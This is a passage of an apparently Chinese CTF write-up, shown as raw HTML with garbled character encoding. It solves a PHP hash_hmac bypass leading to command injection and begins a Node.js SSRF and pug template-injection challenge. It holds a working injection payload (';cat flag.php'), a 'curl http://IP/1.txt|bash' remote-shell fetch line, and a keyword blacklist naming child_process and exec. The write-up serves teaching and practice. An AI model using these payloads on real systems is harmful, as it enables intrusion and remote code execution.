class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;White-cat-monitor&#x27;</span>]))<br>    <span class="hljs-variable">$clandestine</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;White-cat-monitor&#x27;</span>], <span class="hljs-variable">$clandestine</span>);<br><br><br><span class="hljs-variable">$hh</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>], <span class="hljs-variable">$clandestine</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$hh</span> !== <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Black-Cat-Sheriff&#x27;</span>])&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;æœ‰æ„ç„å‡†ï¼Œæ— æ„å‡»å‘ï¼Œä½ çš„æ¢¦æƒ³å°±æ˜¯ä½ è¦ç„å‡†çš„ç›®æ ‡ã€‚ç›¸ä¿¡è‡ªå·±ï¼Œä½ å°±æ˜¯é‚£é¢—å°„ä¸­é¶å¿ƒçš„å­å¼¹ã€‚&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;nc&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>]);<br><br></code></pre></td></tr></table></figure><p>ä»£ç å€’æ˜¯ä¸éš¾ç†è§£ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$clandestine</span> = <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;clandestine&quot;</span>);<span class="hljs-comment">//è¿™é‡Œè·å–äº†ç¯å¢ƒå˜é‡ä¸­clandestineçš„å€¼ï¼Œåé¢ä¼šæŠŠå®ƒå½“æˆåŠ å¯†å¯†é’¥</span><br><span class="hljs-variable">$clandestine</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;White-cat-monitor&#x27;</span>], <span class="hljs-variable">$clandestine</span>);<span class="hljs-comment">//ä½¿ç”¨åˆšæ‰é‚£ä¸ªåŠ å¯†å¯†é’¥+sha256ç®—æ³•å¯¹POSTçš„å¯¹åº”å†…å®¹è¿›è¡ŒåŠ å¯†ï¼Œç„¶åèµ‹å€¼ç»™$clandestineï¼Œè¿™ä¸œè¥¿æ˜¯ä¸‹ä¸€æ®µåŠ å¯†çš„å¯†é’¥</span><br><span class="hljs-variable">$hh</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>], <span class="hljs-variable">$clandestine</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$hh</span> !== <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Black-Cat-Sheriff&#x27;</span>])<span class="hljs-comment">//è¿™é‡Œå¦‚æœç›¸ç­‰ä¼šæ‰§è¡Œï¼š</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;nc&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>]);<br></code></pre></td></tr></table></figure><p><code>hash_hmac</code>è¿™ä¸œè¥¿ç‰¹æ€§å’Œ<code>md5</code>ä¸€æ ·ï¼Œå¦‚æœç»™ä¸€ä¸ªæ•°ç»„åŠ å¯†ä»–ç›´æ¥å°±è¿”å›<code>NULL</code>äº†(ä¸è€ƒè™‘æŠ¥é”™)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$data</span> = [<span class="hljs-number">0</span>];<br><br><span class="hljs-variable">$hmac</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$key</span>);<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$hmac</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//ç»“æœ:</span><br>Warning: <span class="hljs-title function_ invoke__">hash_hmac</span>() expects parameter <span class="hljs-number">2</span> to be <span class="hljs-keyword">string</span>, <span class="hljs-keyword">array</span> given in /box/script.php on line <span class="hljs-number">4</span><br><span class="hljs-literal">NULL</span><br></code></pre></td></tr></table></figure><p><code>One-ear</code>å°±æ˜¯åé¢è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œç°åœ¨å¯†é’¥æœ‰äº†å¾ˆå®¹æ˜“æ±‚å¯¹åº”åŠ å¯†å‡ºçš„<code>$hh</code></p><p>æ¥ä¸‹æ¥æ˜¯<code>exec</code>å‘½ä»¤æ‰§è¡Œï¼š</p><p><code>exec</code>å‘½ä»¤æ‰§è¡Œæœ‰å…³å›æ˜¾çš„é—®é¢˜ï¼š</p><p>é¦–å…ˆè¿™ä¸œè¥¿åªè¿”å›å‘½ä»¤æ‰§è¡Œç»“æœçš„æœ€åä¸€è¡Œï¼Œè€Œä¸ä¼šå°†è¾“å‡ºç›´æ¥å‘é€åˆ°æµè§ˆå™¨æˆ–è€…å‘½ä»¤è¡Œ(ä¸è¿‡é¢˜ç›®ä¸­å’Œ<code>echo</code>æ­é…ä½¿ç”¨äº†)ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br><br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-comment">//è¿™ä¸œè¥¿æ²¡è¾“å‡º</span><br><br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;ls&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//ç»“æœï¼š</span><br>run<br>script.php<br>script.php<br></code></pre></td></tr></table></figure><p>å‰é¢æ”¾äº†ä¸ª<code>nc</code>æ‰€ä»¥è¦ç”¨åˆ†å·ç»™å®ƒåˆ†å¼€(ç±»ä¼¼<code>system</code>åŒæ—¶æ‰§è¡Œå¤šä¸ªå‘½ä»¤)ã€‚</p><p>å…ˆæ˜¯å¾ˆå¤šå¸ˆå‚…ç”¨çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//ç”Ÿæˆhash</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$data</span> = [<span class="hljs-number">0</span>];<br><span class="hljs-variable">$key</span> = <span class="hljs-literal">NULL</span>;<br><span class="hljs-variable">$data2</span> = <span class="hljs-string">&#x27;;cat flag.php&#x27;</span>;<br><span class="hljs-variable">$hmac2</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$data2</span>, <span class="hljs-variable">$key</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$hmac2</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$one</span><span class="hljs-attribute">-ear</span>=;cat flag.php<br>è¿™æ—¶åŠ å¯†å¯†é’¥å˜æˆäº†<span class="hljs-literal">NULL</span><br>payload:<br>White-cat-monitor[]=0&amp;<span class="hljs-attribute">One-ear</span>=;cat flag.php&amp;<span class="hljs-attribute">Black-Cat-Sheriff</span>=04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå…¶å®ä¸çŸ¥é“ä¸ºå•¥ç›´æ¥<code>cat flag.php</code>äº†ï¼Œæ„Ÿè§‰<code>ls</code>æ²¡å¤ªå¤§ä½œç”¨ã€‚<code>buu</code>çš„è¯<code>flag</code>åœ¨ç¯å¢ƒå˜é‡é‡Œï¼Œpayloadæ¢æˆ<code>;env</code>å°±è¡Œï¼Œæˆ–è€…åå¼¹shell:<code>curl http://IP/1.txt|bash</code></p><h4 id="æ€è·¯æ€»ç»“ï¼š-5"><a href="#æ€è·¯æ€»ç»“ï¼š-5" class="headerlink" title="æ€è·¯æ€»ç»“ï¼š"></a>æ€è·¯æ€»ç»“ï¼š</h4><p>hashåŠ å¯†ï¼Œexecå‘½ä»¤æ‰§è¡Œã€‚</p><h2 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2><p><code>js</code>çš„é¢˜ï¼Ÿé¡ºä¾¿æŸ¥äº†ä¸‹<code>pug</code>ï¼Œä¸€ä¸ªæ¨¡æ¿å¼•æ“ã€‚</p><p>![1GYCTF2020Node Game](img&#x2F;1GYCTF2020Node Game.png)</p><p>ä¸Šé¢çš„é“¾æ¥ç›´æ¥ç»™äº†æºç ï¼Œæ³¨æ„è¿™ä¸ª<code>URL</code>ï¼š<code>core?q=source</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// å¼•å…¥æ‰€éœ€çš„æ¨¡å—</span><br><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> pug = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;pug&#x27;</span>);<br><span class="hljs-keyword">var</span> morgan = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;morgan&#x27;</span>);<br><span class="hljs-keyword">const</span> multer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;multer&#x27;</span>);<br><br><span class="hljs-comment">// è®¾ç½®ä¸­é—´ä»¶</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">multer</span>(&#123; <span class="hljs-attr">dest</span>: <span class="hljs-string">&#x27;./dist&#x27;</span> &#125;).<span class="hljs-title function_">array</span>(<span class="hljs-string">&#x27;file&#x27;</span>));<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">morgan</span>(<span class="hljs-string">&#x27;short&#x27;</span>));<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;/uploads&quot;</span>, express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;/uploads&#x27;</span>)));<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;/template&quot;</span>, express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;/template&#x27;</span>)));<br><br><span class="hljs-comment">// å¤„ç†æ ¹è·¯å¾„çš„GETè¯·æ±‚</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">var</span> action = req.<span class="hljs-property">query</span>.<span class="hljs-property">action</span> ? req.<span class="hljs-property">query</span>.<span class="hljs-property">action</span> : <span class="hljs-string">&quot;index&quot;</span>;<br><br>    <span class="hljs-comment">// é˜»æ­¢åŒ…å«æ–œæ çš„è¯·æ±‚</span><br>    <span class="hljs-keyword">if</span> (action.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;/&quot;</span>) || action.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;\\&quot;</span>)) &#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Errrrr, You have been Blocked&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">var</span> file = path.<span class="hljs-title function_">join</span>(__dirname + <span class="hljs-string">&#x27;/template/&#x27;</span> + action + <span class="hljs-string">&#x27;.pug&#x27;</span>);<br>    <span class="hljs-keyword">var</span> html = pug.<span class="hljs-title function_">renderFile</span>(file);<br>    res.<span class="hljs-title function_">send</span>(html);<br>&#125;);<br><br><span class="hljs-comment">// å¤„ç†æ–‡ä»¶ä¸Šä¼ çš„POSTè¯·æ±‚</span><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/file_upload&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">var</span> ip = req.<span class="hljs-property">connection</span>.<span class="hljs-property">remoteAddress</span>;<br>    <span class="hljs-keyword">var</span> obj = &#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;&#x27;</span> &#125;;<br><br>    <span class="hljs-comment">// åªå…è®¸ç‰¹å®šIPè¿›è¡Œæ–‡ä»¶ä¸Šä¼ </span><br>    <span class="hljs-keyword">if</span> (!ip.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)) &#123;<br>        obj.<span class="hljs-property">msg</span> = <span class="hljs-string">&quot;only admin&#x27;s ip can use it&quot;</span>;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj));<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    fs.<span class="hljs-title function_">readFile</span>(req.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>].<span class="hljs-property">path</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">err, data</span>) &#123;<br>        <span class="hljs-keyword">if</span> (err) &#123;<br>            obj.<span class="hljs-property">msg</span> = <span class="hljs-string">&#x27;upload failed&#x27;</span>;<br>            res.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">var</span> file_path = <span class="hljs-string">&#x27;/uploads/&#x27;</span> + req.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>].<span class="hljs-property">mimetype</span> + <span class="hljs-string">&quot;/&quot;</span>;<br>            <span class="hljs-keyword">var</span> file_name = req.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>].<span class="hljs-property">originalname</span>;<br>            <span class="hljs-keyword">var</span> dir_file = __dirname + file_path + file_name;<br><br>            <span class="hljs-comment">// å¦‚æœç›®å½•ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºç›®å½•</span><br>            <span class="hljs-keyword">if</span> (!fs.<span class="hljs-title function_">existsSync</span>(__dirname + file_path)) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    fs.<span class="hljs-title function_">mkdirSync</span>(__dirname + file_path);<br>                &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                    obj.<span class="hljs-property">msg</span> = <span class="hljs-string">&quot;file type error&quot;</span>;<br>                    res.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj));<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                fs.<span class="hljs-title function_">writeFileSync</span>(dir_file, data);<br>                obj = &#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;upload success&#x27;</span>, <span class="hljs-attr">filename</span>: file_path + file_name &#125;;<br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                obj.<span class="hljs-property">msg</span> = <span class="hljs-string">&#x27;upload failed&#x27;</span>;<br>            &#125;<br>            res.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj));<br>        &#125;<br>    &#125;);<br>&#125;);<br><br><span class="hljs-comment">// å¤„ç†&#x27;/source&#x27;è·¯å¾„çš„GETè¯·æ±‚</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/source&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname + <span class="hljs-string">&#x27;/template/source.txt&#x27;</span>));<br>&#125;);<br><br><span class="hljs-comment">// å¤„ç†&#x27;/core&#x27;è·¯å¾„çš„GETè¯·æ±‚</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/core&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">var</span> q = req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span>;<br>    <span class="hljs-keyword">var</span> resp = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">if</span> (q) &#123;<br>        <span class="hljs-keyword">var</span> url = <span class="hljs-string">&#x27;http://localhost:8081/source?&#x27;</span> + q;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(url);<br><br>        <span class="hljs-comment">// æ£€æŸ¥URLæ˜¯å¦åŒ…å«é»‘åå•å…³é”®è¯</span><br>        <span class="hljs-keyword">var</span> trigger = <span class="hljs-title function_">blacklist</span>(url);<br>        <span class="hljs-keyword">if</span> (trigger === <span class="hljs-literal">true</span>) &#123;<br>            res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;error occurs!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// å‘é€HTTPè¯·æ±‚è·å–æ•°æ®å¹¶è½¬å‘ç»™å®¢æˆ·ç«¯</span><br>                http.<span class="hljs-title function_">get</span>(url, <span class="hljs-keyword">function</span>(<span class="hljs-params">resp</span>) &#123;<br>                    resp.<span class="hljs-title function_">setEncoding</span>(<span class="hljs-string">&#x27;utf8&#x27;</span>);<br>                    resp.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">err</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (err.<span class="hljs-property">code</span> === <span class="hljs-string">&quot;ECONNRESET&quot;</span>) &#123;<br>                            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Timeout occurs&quot;</span>);<br>                            <span class="hljs-keyword">return</span>;<br>                        &#125;<br>                    &#125;);<br>                    resp.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">chunk</span>) &#123;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                            resps = chunk.<span class="hljs-title function_">toString</span>();<br>                            res.<span class="hljs-title function_">send</span>(resps);<br>                        &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>                            res.<span class="hljs-title function_">send</span>(e.<span class="hljs-property">message</span>);<br>                        &#125;<br>                    &#125;).<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>                        res.<span class="hljs-title function_">send</span>(e.<span class="hljs-property">message</span>);<br>                    &#125;);<br>                &#125;);<br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(error);<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);<br>    &#125;<br>&#125;);<br><br><span class="hljs-comment">// æ£€æŸ¥URLæ˜¯å¦åŒ…å«é»‘åå•å…³é”®è¯çš„å‡½æ•°</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">blacklist</span>(<span class="hljs-params">url</span>) &#123;<br>    <span class="hljs-keyword">var</span> evilwords = [<span class="hljs-string">&quot;global&quot;</span>, <span class="hljs-string">&quot;process&quot;</span>, <span class="hljs-string">&quot;mainModule&quot;</span>, <span class="hljs-string">&quot;require&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;child_process&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>];<br>    <span class="hljs-keyword">var</span> arrayLen = evilwords.<span class="hljs-property">length</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; arrayLen; i++) &#123;<br>        <span class="hljs-keyword">const</span> trigger = url.<span class="hljs-title function_">includes</span>(evilwords[i]);<br>        <span class="hljs-keyword">if</span> (trigger === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// å¯åŠ¨æœåŠ¡å™¨ç›‘å¬ç«¯å£8081</span><br><span class="hljs-keyword">var</span> server = app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">8081</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> host = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">address</span>;<br>    <span class="hljs-keyword">var</span> port = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">port</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Example app listening at http://%s:%s&quot;</span>, host, port);<br>&#125;);<br></code></pre></td></tr></table></figure><p>ä¸‹é¢çš„é“¾æ¥æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œä¸è¿‡æç¤ºåªæœ‰<code>admin</code>çš„<code>ip</code>æ‰å¯ä»¥ä½¿ç”¨ï¼š<code>?action=upload</code></p><p>ä¸è¿‡å‰é¢çš„ä»£ç å·²ç»è§£é‡Šäº†ï¼Œåªè¦<code>127.0.0.1</code>æ‰è¡Œï¼Œæ³¨æ„è¿™ä¸œè¥¿æ²¡æ³•ä¼ªé€ ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;msg&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;only admin&#x27;s ip can use it&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><code>blacklist</code>å‡½æ•°è¿‡æ»¤äº†ä¸€ç³»åˆ—å…³é”®å­—ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">blacklist</span>(<span class="hljs-params">url</span>) &#123;<br>    <span class="hljs-keyword">var</span> evilwords = [<span class="hljs-string">&quot;global&quot;</span>, <span class="hljs-string">&quot;process&quot;</span>, <span class="hljs-string">&quot;mainModule&quot;</span>, <span class="hljs-string">&quot;require&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;child_process&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>];<br></code></pre></td></tr></table></figure><p>ä¸è¿‡<code>js</code>æœ¬èº«å°±æ˜¯ä¸€ç§éå¸¸çµæ´»çš„è¯­è¨€ï¼Œæ‰€ä»¥ä»–è¿™ä¹ˆè¿‡æ»¤åŸºæœ¬æ²¡å•¥ç”¨ã€‚</p><p>æœäº†ä¸‹<code>pug</code>æ¨¡æ¿æ³¨å…¥ï¼Œä¹Ÿå‚è€ƒäº†å‡ ä½å¸ˆå‚…çš„æ–‡ç« ï¼š</p><p><a href="https://chenlvtang.top/2021/03/08/%E9%80%9A%E8%BF%87HTTP%E8%AF%B7%E6%B1%82%E6%8B%86%E5%88%86%E8%BF%9B%E8%A1%8CSSRF/">å‚è€ƒæ–‡ç« </a></p><p><a href="https://guokeya.github.io/post/hz6_KR03h/">å‚è€ƒwenzhang</a></p><p>æ€è·¯å°±æ˜¯é€šè¿‡<code>core</code>è·¯ç”±æä¾›çš„å†…ç½‘<code>URL</code>è¯·æ±‚è¿›è¡Œ<code>SSRF</code>å®ç°<code>file_upload</code>è·¯ç”±ä¸­æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ã€‚ç„¶åé…åˆ<code>pugæ¨¡æ¿</code>æ¸²æŸ“è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><p>å‚è€ƒæ–‡ç« 